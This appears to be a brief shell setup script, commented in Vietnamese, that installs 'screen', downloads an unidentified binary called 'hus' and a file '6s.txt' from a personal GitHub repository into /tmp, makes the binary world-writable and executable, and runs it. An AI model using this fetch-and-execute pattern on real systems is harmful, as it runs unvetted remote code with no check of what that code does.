#!/bin/bash

# Cài đặt screen
sudo apt-get install -y screen

# Đi đến thư mục /tmp
cd /tmp

# Tải xuống file 6s.txt và hus
wget https://raw.githubusercontent.com/khangcbs/66/main/6s.txt
wget https://github.com/khangcbs/66/raw/main/hus

# Đặt quyền thực thi cho file hus
chmod 777 hus

# Chạy file hus trong screen
#screen -dmS hus_session ./hus
./hus
